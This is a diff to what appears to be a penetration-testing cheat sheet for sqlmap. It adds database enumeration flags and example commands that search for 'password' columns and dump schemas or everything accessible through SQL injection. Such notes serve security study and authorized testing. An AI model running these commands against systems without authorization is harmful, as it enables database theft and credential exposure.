@@ -120,17 +120,20 @@ When you have identified a DB name, you can start enumerating tables and their c
 
 Useful flags for table enumeration inlcude:
 
-| Flag                      | Description                                       |
-| ------------------------- | ------------------------------------------------- |
-| `--tables`                | `Enumerate tables`                                |
-| `-D`                      | `Name of DB `                                     |
-| `-T`                      | `Name of table`                                   |
-| `-C`                      | `Name of column`                                  |
-| `--start`                 | `Specific row/s - start range`                    |
-| `--stop`                  | `Specific row/s - end range`                      |
-| `--dump`                  | `Dump content in table`                           |
-| `--dump-all`              | `Dump all tables in DB`                           |
-| `--exclude-sysdbs`        | `Skip default system DBs when dumping all tables` |
+| Flag                      | Description                                         |
+| ------------------------- | --------------------------------------------------- |
+| `--tables`                | `Enumerate tables`                                  |
+| `-D`                      | `Name of DB `                                       |
+| `-T`                      | `Name of table`                                     |
+| `-C`                      | `Name of column`                                    |
+| `--start`                 | `Specific row/s - start range`                      |
+| `--stop`                  | `Specific row/s - end range`                        |
+| `--dump`                  | `Dump content in table`                             |
+| `--dump-all`              | `Dump all tables in DB`                             |
+| `--exclude-sysdbs`        | `Skip default system DBs when dumping all tables`   |
+| `--schema`                | `Retrieve structure of each table in DB`            |
+| `--search`                | `Search for DBs, tables or columns within the DBMS` |
+| `--all`                   | `Retrieve everything accessible`                    |
 
 Enumerate all tables in DB called **testdb**:
 
@@ -168,6 +171,35 @@ Dump data from all tables from all DBs in the entire DBMS:
 sqlmap -r req.txt --dump-all --exclude-sysdbs --batch
 ```
 
+Retrieve the strucutre of each table in DB **testdb**:
+
+```
+sqlmap -r req.txt --schema --batch
+```
+
+Search for DB name containing keyword **master**:
+
+```
+sqlmap -r req.txt --search -D master --batch
+```
+
+Search for table name containing keyword **users**:
+```
+sqlmap -r req.txt --search -T users
+```
+
+Search for columns containing keyword **password**
+
+```
+sqlmap -r req.txt --search -C password --batch
+```
+
+Retrieve everything accessible (might take some time):
+
+```
+sqlmap -r req.txt --all --batch
+```
+
 ---
 
-## Advanced Database Enumeration
+Bypassing Security Systems
